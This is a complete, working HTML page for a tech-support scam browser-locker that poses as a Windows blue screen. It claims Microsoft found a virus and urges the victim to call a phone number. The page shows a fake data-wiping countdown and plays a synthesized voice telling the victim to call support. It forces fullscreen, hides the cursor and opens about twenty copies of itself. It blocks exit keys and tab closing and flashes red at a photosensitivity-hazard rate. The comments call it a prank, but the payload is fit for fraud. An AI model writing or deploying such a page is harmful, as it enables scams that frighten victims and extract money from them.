<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY FAILURE: VIRUS DETECTED</title>
    
    <!-- Load Tone.js for stable, customizable audio generation -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.min.js"></script>
    <style>
        /* Use a standard monospace font for the classic BSOD look */
        body, .bsod-container {
            font-family: 'Consolas', 'Courier New', monospace;
            line-height: 1.5; 
        }

        /* --- EXTREME CURSOR SUPPRESSION (CSS LAYER) --- */
        * {
            cursor: none !important; 
            user-select: none; 
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }
        
        /* Ensure HTML and BODY fully cover the viewport without scrolling */
        html, body {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden; 
            cursor: none !important; 
            /* Set the default look to the BSOD */
            background-color: #0078D7; 
            color: #FFFFFF;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: left; 
            /* Base transition for shake effect */
            transition: transform 0.01s ease-out; 
        }

        /* --- SCREEN SHAKE EFFECT --- */
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
        
        body.shake-active {
            animation: shake 0.01s infinite; /* EXTREME SHAKE SPEED */
        }


        /* --- BSOD Content Styling --- */
        .bsod-container {
            width: 90%;
            max-width: 900px; 
            padding: 40px; 
            z-index: 5; 
        }
        .smiley {
            font-size: 100px; 
            line-height: 1;
            margin-bottom: 30px; 
        }
        .message-title {
            font-size: 42px; 
            font-weight: normal;
            margin-bottom: 25px; 
        }
        .message-details {
            font-size: 18px;
            line-height: 1.8; 
            margin-bottom: 25px; 
            white-space: pre-wrap; 
        }
        .message-details strong {
            font-weight: normal; 
            color: #FF00FF; /* Pink/Magenta for max distraction */
        }
        .stop-code {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 40px; 
        }

        /* --- Red Taunt Overlay (Error Flash) */
        #taunt-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* Semi-transparent red allows the BSOD to show through slightly, enhancing the glitch */
            background-color: rgba(255, 0, 0, 0.9); 
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000; /* Max z-index for this overlay */
            opacity: 0;
            pointer-events: none; 
            transition: opacity 0.001s linear; /* NEAR INSTANT TRANSITION */
            text-align: center;
        }
        #taunt-overlay.active {
            opacity: 1;
        }
        .overlay-text {
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 72px; 
            font-weight: bold;
            color: #FFFFFF;
            padding: 20px;
            text-shadow: 0 0 40px rgba(255, 255, 0, 1.0); /* Brighter shadow */
            animation: pulsate 0.05s infinite alternate; /* Faster pulsate */
        }
        @keyframes pulsate {
            from { opacity: 0.5; }
            to { opacity: 1.0; }
        }
    </style>
</head>
<body>

    <!-- Red Taunt Overlay - Hidden by default -->
    <div id="taunt-overlay">
        <div id="overlay-text" class="overlay-text">
            [ FATAL ERROR: IMMUNITY LOOP REINFORCED ]
        </div>
    </div>

    <!-- The actual BSOD content -->
    <div id="bsod-container" class="bsod-container">
        <div class="smiley">:(</div>
        
        <!-- TECH SCAM MESSAGE TEXT -->
        <div class="message-title">Microsoft detected a virus on your computer and have locked your device to prevent malicious activities. To resolve this issue Please call Microsoft @ XXXXXXXXXXX</div>
        
        <div class="message-details">
Do not restart your computer or you may lose your important data that you have. you can search online later for this error: CRITICAL_PROCESS_DIED<br>
Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
        </div>
        
        <div class="stop-code">
            Click anywhere to begin CRITICAL FAILSAFE SEQUENCE...
        </div>
    </div>

    <script>
        // Placeholder environment variables (required for execution)
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null; 

        const htmlEl = document.documentElement;
        const bodyEl = document.body;
        const tauntOverlay = document.getElementById('taunt-overlay');
        const tauntText = document.getElementById('overlay-text');
        const progressEl = document.getElementById('progress-percent');
        
        let isSimulatingFailure = false;
        let audioContextStarted = false;
        let progress = 0;
        let prankActivated = false; 
        
        // --- Glitch loop variable ---
        let ambientGlitchInterval;

        // --- TTS & Audio Conversion Utilities (Needed for playback) ---
        function base64ToArrayBuffer(base64) {
            const binaryString = atob(base64);
            const len = binaryString.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }

        function pcmToWav(pcm16, sampleRate) {
            const numChannels = 1;
            const bitsPerSample = 16;
            const byteRate = sampleRate * numChannels * (bitsPerSample / 8);
            const blockAlign = numChannels * (bitsPerSample / 8);
            const dataSize = pcm16.length * 2;
            const fileSize = 36 + dataSize;

            const buffer = new ArrayBuffer(fileSize);
            const view = new DataView(buffer);
            let offset = 0;

            function writeString(s) {
                for (let i = 0; i < s.length; i++) {
                    view.setUint8(offset++, s.charCodeAt(i));
                }
            }
            writeString('RIFF');
            view.setUint32(offset, fileSize - 8, true); offset += 4;
            writeString('WAVE');
            writeString('fmt ');
            view.setUint32(offset, 16, true); offset += 4;
            view.setUint16(offset, 1, true); offset += 2;
            view.setUint16(offset, numChannels, true); offset += 2;
            view.setUint32(offset, sampleRate, true); offset += 4;
            view.setUint32(offset, byteRate, true); offset += 4;
            view.setUint16(offset, blockAlign, true); offset += 2;
            view.setUint16(offset, bitsPerSample, true); offset += 2;
            writeString('data');
            view.setUint32(offset, dataSize, true); offset += 4;
            
            for (let i = 0; i < pcm16.length; i++) {
                view.setInt16(offset, pcm16[i], true); offset += 2;
            }

            return new Blob([view], { type: 'audio/wav' });
        }


        // --- 1. SUPER-AGGRESSIVE CURSOR/FULLSCREEN FIX LOOP ---
        const hideAndLock = () => {
            if (!prankActivated) return;
            document.documentElement.style.cursor = 'none';
            // Re-assert pointer lock (often fails silently, but constant attempts help)
            document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
            if (document.body.requestPointerLock && !document.pointerLockElement) {
                document.body.requestPointerLock();
            }
            if (!document.fullscreenElement) {
                forceFullscreen();
            }
            requestAnimationFrame(hideAndLock);
        };
        
        // --- Tone.js Audio Setup (MAX AGGRESSION) ---
        const ALARM_BPM_NORMAL = 600;
        const ALARM_BPM_MAX = 900;
        
        // 1. Dissonant background alarm (C# and D for maximum unease)
        const alarmSynth = new Tone.AMSynth({
            frequency: 440,
            oscillator: { type: "square" },
            envelope: { attack: 0.001, decay: 0.05, sustain: 0.0, release: 0.05 },
            volume: 0 
        }).toDestination();

        const alarmSequence = new Tone.Sequence((time, note) => {
            alarmSynth.triggerAttackRelease(note, "16n", time);
        }, ["C#6", "D6", "C#6", "D6"], "16n"); // Faster, more dissonant
        alarmSequence.loop = true;

        // 2. High-frequency noise ping for extra stress
        const pingSynth = new Tone.NoiseSynth({
            noise: { type: "white" },
            envelope: { attack: 0.001, decay: 0.01, sustain: 0.0, release: 0.01 },
            volume: 5 
        }).toDestination();
        
        const pingSequence = new Tone.Sequence((time, note) => {
             pingSynth.triggerAttackRelease("64n", time);
        }, ["*"], "32n"); // Fires constantly
        pingSequence.loop = true;


        // 3. The escape failure noise 
        const noiseSynth = new Tone.NoiseSynth({
            noise: { type: "pink" },
            envelope: { attack: 0.001, decay: 0.01, sustain: 0.0, release: 0.01 },
            volume: 15 
        }).toDestination();

        // 4. The deep, scary bass drone for initial activation
        const scaryDroneSynth = new Tone.Synth({
            oscillator: { type: "sawtooth" },
            envelope: { attack: 0.1, decay: 2.0, sustain: 0.0, release: 0.1 },
            volume: 0 
        }).toDestination();

        function playScaryDrone() {
            if (Tone.Transport.state !== 'started') {
                 Tone.start().then(() => {
                    scaryDroneSynth.triggerAttackRelease("C1", "2s");
                });
            } else {
                 scaryDroneSynth.triggerAttackRelease("C1", "2s");
            }
        }
        
        // --- FAKE PROGRESS BAR ---
        function startProgressLoop() {
            const progressInterval = setInterval(() => {
                if (!prankActivated) {
                    clearInterval(progressInterval);
                    return;
                }
                
                if (progress < 100) {
                    progress += Math.floor(Math.random() * 3) + 1; // More erratic progress
                    if (progress > 100) progress = 100;
                    progressEl.textContent = `${progress}% complete`;
                } else {
                    // When 100% is reached, stop the interval and display the final message
                    progressEl.textContent = `100% complete... LOCKDOWN COMPLETE. DATA IS GONE.`;
                    clearInterval(progressInterval); 
                    // CRITICAL CHANGE: Do NOT call simulateClosingFailure here. 
                    // The ambientGlitchInterval keeps the glitch running.
                }
            }, 50); // Much faster update
        }

        // --- Background Alarm Starter ---
        function startBackgroundAlarm() {
            if (!prankActivated || audioContextStarted) return;
            audioContextStarted = true;
            
            // Tone.start() is already called in activatePrank for context stability
            alarmSequence.start(0); 
            pingSequence.start(0); 
            Tone.Transport.bpm.value = ALARM_BPM_NORMAL; 
            Tone.Transport.start();

            document.querySelector('.stop-code').textContent = "SYSTEM OVERLOAD: 0xDEAD000F (0xEEEEEEEE, 0xFFFFFFFF) | IMMORTALITY PROTOCOL ONLINE";
            startProgressLoop();
        }


        // --- TTS Generation and Playback ---
        async function speakAndPlayWarning() {
            const ttsPrompt = "Say in a confident, synthesized, and slightly demanding voice: Do not turn off your computer. Your device is infected. Contact Microsoft support immediately on the number displayed to prevent data loss.";
            const apiKey = ""; 
            const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent?key=${apiKey}`;

            const payload = {
                contents: [{ parts: [{ text: ttsPrompt }] }],
                generationConfig: {
                    responseModalities: ["AUDIO"],
                    speechConfig: {
                        voiceConfig: { prebuiltVoiceConfig: { voiceName: "Charon" } } // Deep voice
                    }
                },
                model: "gemini-2.5-flash-preview-tts"
            };

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();
                const part = result?.candidates?.[0]?.content?.parts?.[0];
                const audioData = part?.inlineData?.data;
                const mimeType = part?.inlineData?.mimeType;

                if (audioData && mimeType && mimeType.startsWith("audio/L16")) {
                    const rateMatch = mimeType.match(/rate=(\d+)/);
                    const sampleRate = rateMatch ? parseInt(rateMatch[1], 10) : 24000;
                    const pcmBuffer = base64ToArrayBuffer(audioData);
                    const pcm16 = new Int16Array(pcmBuffer);
                    const wavBlob = pcmToWav(pcm16, sampleRate);
                    const audioUrl = URL.createObjectURL(wavBlob);
                    const audio = new Audio(audioUrl);
                    await audio.play();
                    audio.onended = startBackgroundAlarm;
                } else {
                    console.error("TTS data missing or invalid. Falling back to immediate alarm start.");
                    startBackgroundAlarm();
                }

            } catch (error) {
                console.error("TTS API call failed:", error.message);
                // Crucial Fallback: Always start the alarm if TTS fails
                startBackgroundAlarm();
            }
        }
        
        // --- Helper for Random Window Placement (Larger Windows) ---
        function getRandomWindowFeatures(width = 800, height = 600) {
            const screenW = window.screen.width - width;
            const screenH = window.screen.height - height;
            const left = Math.floor(Math.random() * screenW);
            const top = Math.floor(Math.random() * screenH);
            return `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes,status=yes`;
        }
            
        // --- Window Flood Functions ---
        
        const currentUrl = window.location.href; // Get the URL of this exact page
        
        // 1. ASYNCHRONOUS DELAYED FLOOD (10 windows)
        function startSecondaryFlood() {
            const NUM_STAGGERED_WINDOWS = 10; 
            let count = 0;
            
            const floodInterval = setInterval(() => {
                if (count >= NUM_STAGGERED_WINDOWS) {
                    clearInterval(floodInterval);
                    return;
                }
                // Open a new, larger window loading the exact same prank page
                window.open(currentUrl, '_blank', getRandomWindowFeatures(600, 400));
                count++;
            }, 50); 
        }

        // 2. HYPER-SYNCHRONOUS IMMEDIATE BLAST (10 windows)
        function startSynchronousBlast() {
            const NUM_WINDOWS = 10; 
            for (let i = 0; i < NUM_WINDOWS; i++) {
                // Open a new, massive window loading the exact same prank page
                window.open(currentUrl, '_blank', getRandomWindowFeatures(800, 600));
            }
        }

        // --- Fullscreen and Pointer Lock (Wrapped) ---
        function forceFullscreen() {
            const requestFullscreen = htmlEl.requestFullscreen || htmlEl.mozRequestFullScreen || htmlEl.webkitRequestFullscreen || htmlEl.msRequestFullscreen;
            if (requestFullscreen) {
                requestFullscreen.call(htmlEl).catch(e => console.log("Fullscreen request blocked/rejected:", e));
            }
        }
        
        function forcePointerLock() {
            document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
            if (document.body.requestPointerLock && !document.pointerLockElement) {
                document.body.requestPointerLock();
            }
        }

        // --- Red Flash & Shake Function (Maximum Glitch) ---
        function simulateClosingFailure(isEscapeAttempt = false) {
            // Note: isEscapeAttempt controls the audio response (pitch change/noise burst)
            if (!prankActivated || isSimulatingFailure) return;

            isSimulatingFailure = true; 
            tauntOverlay.classList.add('active');
            bodyEl.classList.add('shake-active'); 
            
            // Randomize taunt message position slightly on failure
            tauntText.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`; 
            
            if(isEscapeAttempt && Tone.Transport.state === 'started') {
                noiseSynth.triggerAttackRelease("32n"); 
                Tone.Transport.bpm.value = ALARM_BPM_MAX; 
            }

            // The flash duration remains ultra-short for maximum flicker effect
            setTimeout(() => {
                tauntOverlay.classList.remove('active');
                bodyEl.classList.remove('shake-active'); 
                tauntText.style.transform = `none`; // Reset position
                isSimulatingFailure = false;
                
                if(isEscapeAttempt && Tone.Transport.state === 'started') {
                    Tone.Transport.bpm.value = ALARM_BPM_NORMAL; 
                }
            }, 10); 
        }

        // --- New: Constant Ambient Glitch Loop ---
        function startAmbientGlitchLoop() {
            // Triggers a full flash and shake every 750 milliseconds
            ambientGlitchInterval = setInterval(() => {
                simulateClosingFailure(false);
            }, 750);
        }

        // --- Core Activation Logic (Single Click Trigger) ---
        function activatePrank() {
            if (prankActivated) return;
            prankActivated = true;
            
            // CRITICAL SYNCHRONOUS ACTIONS
            Tone.start().then(() => {
                playScaryDrone(); 
                speakAndPlayWarning(); 
            });

            forceFullscreen();
            forcePointerLock(); 

            // START THE CONSTANT, AMBIENT GLITCH LOOP
            startAmbientGlitchLoop();

            // EXTREME SYNCHRONOUS BLAST (The main cascade starter)
            startSynchronousBlast(); 
            
            // ASYNCHRONOUS ACTIONS (Start the loops)
            requestAnimationFrame(hideAndLock); // Start the hyper-aggressive lock loop
            startSecondaryFlood();

            document.removeEventListener('click', activatePrank);
        }
        
        document.addEventListener('click', activatePrank, { once: true });


        
        // === THE ESCAPE TRAP: AGGRESSIVE RE-ENTRY AND RED FLASH ===
        // This still uses simulateClosingFailure(true) for the escape-specific audio/BPM change
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && prankActivated) {
                simulateClosingFailure(true);
                setTimeout(forceFullscreen, 0); 
            }
        });

        
        // === THE ONBLUR TRAP: Alt+Tab or clicking outside ===
        window.onblur = function() {
            if (!prankActivated) return; 
            simulateClosingFailure(true);
            setTimeout(() => {
                window.focus();
            }, 1); 
        };
        
        // === THE ONBEFOREUNLOAD TRAP: Closing the Tab/Window 'X' Button ===
        window.onbeforeunload = function(e) {
            if (!prankActivated) return;
            simulateClosingFailure(true);

            const tauntMessage = 'SYSTEM TRAP ACTIVE: ATTEMPTED EXIT DETECTED. ALL DATA WILL BE WIPED.';
            e.returnValue = tauntMessage; 
            return tauntMessage; 
        };


        // === Anti-Shortcut (Blocks Esc, Alt+F4, F11, Ctrl+W/Cmd+W) ===
        document.onkeydown = function(e) {
            if (!prankActivated) return;
            
            if (e.key === "Escape" || e.key === "F11") {
                e.preventDefault(); 
                e.stopPropagation(); 
                simulateClosingFailure(true);
                return; 
            }

            if ((e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') || (e.metaKey && e.key === 'w') || (e.ctrlKey && e.key === 'W')) {
                e.preventDefault(); 
                e.stopPropagation(); 
                simulateClosingFailure(true);
            }
        };
    </script>
</body>
</html>
